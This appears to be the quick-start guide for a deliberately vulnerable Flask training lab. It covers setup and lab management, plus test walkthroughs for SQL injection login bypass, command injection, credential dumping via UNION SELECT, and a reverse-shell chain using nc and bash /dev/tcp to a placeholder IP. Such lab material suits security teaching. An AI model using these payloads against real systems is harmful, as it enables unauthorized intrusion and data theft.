# BootCamp-Lab - Quick Start Guide

## ⚡ Fastest Way to Get Started

### Option 1: Direct Python (Recommended for Testing)

```bash
# 1. Navigate to project
cd /home/h3llo/Documents/0x-lab/xlab/ManBehindtheHat

# 2. Create virtual environment
python3 -m venv venv
source venv/bin/activate

# 3. Install dependencies
pip install -r requirements.txt

# 4. Create environment file
cp .env.example .env

# 5. Run the application
python3 app.py
```

**Access:** http://localhost:5000

**Default Login:**
- Username: `admin`
- Password: `admin123`

---

### Option 2: Docker (Recommended for Deployment)

```bash
# 1. Navigate to project
cd /home/h3llo/Documents/0x-lab/xlab/ManBehindtheHat

# 2. Build and run
docker-compose up -d

# 3. Check logs
docker-compose logs -f
```

**Access:** http://localhost:5000

---

### Option 3: Ubuntu Server Deployment

```bash
# 1. Copy to server
scp -r ManBehindtheHat user@server:/opt/

# 2. SSH to server
ssh user@server

# 3. Run deployment script
cd /opt/ManBehindtheHat
sudo ./deploy.sh
```

**Access:** http://SERVER_IP:5000

---

## Quick Testing

### Test 1: SQL Injection (30 seconds)
```
1. Go to http://localhost:5000/login
2. Username: admin' OR '1'='1' --
3. Password: anything
4. Click Login
✓ You should be logged in as admin
```

### Test 2: Command Injection (1 minute)
```
1. Login first (admin/admin123)
2. Go to http://localhost:5000/ping
3. Host: 127.0.0.1; whoami
4. Click Execute Ping
✓ You should see the current user
```

### Test 3: Information Disclosure (30 seconds)
```
1. Go to http://localhost:5000/debug
✓ You should see SECRET_KEY and database config
```

### Test 4: File Upload (1 minute)
```
1. Login first
2. Go to http://localhost:5000/upload
3. Create a test.py file with: print("Hello from BootCamp-Lab!")
4. Upload it
5. Access http://localhost:5000/uploads/test.py
✓ File should be accessible
```

---

## Full Exploitation Chain (5 minutes)

```bash
# 1. Recon
curl http://localhost:5000/debug | grep SECRET_KEY

# 2. SQL Injection - Get credentials
curl "http://localhost:5000/search?q=' UNION SELECT id,username,password,email,role FROM users--"

# 3. Command Injection - Get shell
# Setup listener first
nc -lvnp 4444

# In another terminal, send payload:
curl -X POST http://localhost:5000/ping \
  -d "host=127.0.0.1; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" \
  -b "session=YOUR_SESSION_COOKIE"

# 4. You now have a shell!
```

---

## Project Structure

```
ManBehindtheHat/
├── app.py                 # Main Flask application
├── config.py             # Configuration settings
├── requirements.txt      # Python dependencies
├── .env.example         # Environment template
├── templates/           # HTML templates
│   ├── base.html
│   ├── index.html
│   ├── login.html
│   ├── search.html
│   ├── upload.html
│   ├── ping.html
│   └── ...
├── uploads/             # Uploaded files (created on first run)
├── instance/            # Database location (created on first run)
├── deploy.sh            # Ubuntu deployment script
├── reset_lab.sh         # Reset database and uploads
├── uninstall.sh         # Remove application
├── Dockerfile           # Docker configuration
├── docker-compose.yml   # Docker Compose config
├── README.md            # Full documentation
├── CHEATSHEET.md        # Exploitation guide
├── INSTRUCTOR_GUIDE.md  # Teaching guide
└── DOCKER.md            # Docker guide
```

---

## 🎓 Learning Path

### Beginner (Start Here)
1. Read [README.md](README.md) - Overview
2. Try Quick Testing (above)
3. Study [CHEATSHEET.md](CHEATSHEET.md) - Exploitation basics

### Intermediate
1. Practice each vulnerability type
2. Chain exploits together
3. Write automated scripts

### Advanced
1. Read [INSTRUCTOR_GUIDE.md](INSTRUCTOR_GUIDE.md)
2. Create custom payloads
3. Practice report writing
4. Set up for bootcamp

---

## 🔧 Useful Commands

### Application Management
```bash
# Start
python3 app.py
# or
systemctl start BootCamp-Lab  # If deployed with deploy.sh

# Stop
Ctrl+C  # If running directly
# or
systemctl stop BootCamp-Lab

# Restart
systemctl restart BootCamp-Lab

# View logs
journalctl -u BootCamp-Lab -f
# or
docker-compose logs -f
```

### Database Management
```bash
# Access database directly
sqlite3 instance/vulnerable_app.db

# View all users
sqlite3 instance/vulnerable_app.db "SELECT * FROM users;"

# Reset database
rm instance/vulnerable_app.db
python3 -c "from app import init_db; init_db()"
```

### Lab Reset
```bash
# Quick reset (if deployed)
sudo /opt/BootCamp-Lab/reset_lab.sh

# Manual reset
rm instance/*.db
rm -rf uploads/*
python3 app.py  # Will reinitialize
```

---

## Important Security Notes

### NEVER DO THIS:
- Deploy on public internet
- Use in production environment
- Expose to untrusted networks
- Use real user data
- Connect to production databases

###  ALWAYS DO THIS:
- Use in isolated lab environment
- Set up proper network segmentation
- Keep backups before testing
- Document everything
- Practice ethical hacking principles

---

##  Troubleshooting

### "Port 5000 already in use"
```bash
# Find and kill process
sudo lsof -i :5000
sudo kill -9 PID

# Or use different port
# Edit app.py, change last line:
app.run(host='0.0.0.0', port=8080, debug=True)
```

### "Module not found"
```bash
# Activate virtual environment
source venv/bin/activate

# Reinstall dependencies
pip install -r requirements.txt
```

### "Database locked"
```bash
# Stop all instances
pkill -f "python3 app.py"
systemctl stop BootCamp-Lab

# Reset database
rm instance/vulnerable_app.db
python3 app.py
```

### "Can't connect from other machines"
```bash
# Check firewall
sudo ufw status
sudo ufw allow 5000/tcp

# Make sure app binds to 0.0.0.0 (not 127.0.0.1)
# This is already correct in app.py
```

---

## Next Steps

1. **For Students:**
   - Work through [CHEATSHEET.md](CHEATSHEET.md)
   - Practice each vulnerability
   - Write exploitation scripts
   - Create penetration test report

2. **For Instructors:**
   - Read [INSTRUCTOR_GUIDE.md](INSTRUCTOR_GUIDE.md)
   - Plan session structure
   - Set up lab environment
   - Prepare assessment rubrics

3. **For Developers:**
   - Study the vulnerable code in [app.py](app.py)
   - Understand why each vulnerability exists
   - Learn secure coding practices
   - Compare with secure implementations

---

## Tips for Success

1. **Start Simple:** Don't try everything at once
2. **Document Everything:** Take notes as you go
3. **Understand Why:** Don't just copy/paste exploits
4. **Practice Ethically:** Always get permission
5. **Think Like Attacker:** Be creative and persistent

---

## Contributing

Found a bug? Want to add features?

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

---

## Support

- **Documentation:** Check all .md files
- **Issues:** Create GitHub issue
- **Questions:** Contact instructor/coordinator

---

## Ready to Start?

Choose your option and get hacking! 

```bash
# Quick start for impatient hackers 😈
cd ManBehindtheHat && python3 -m venv venv && source venv/bin/activate && pip install -r requirements.txt && python3 app.py
```

**Happy Hacking!**

Remember: *With great power comes great responsibility.* Use these skills ethically and legally.

---

*BootCamp-Lab - Built for Offensive Security Training*
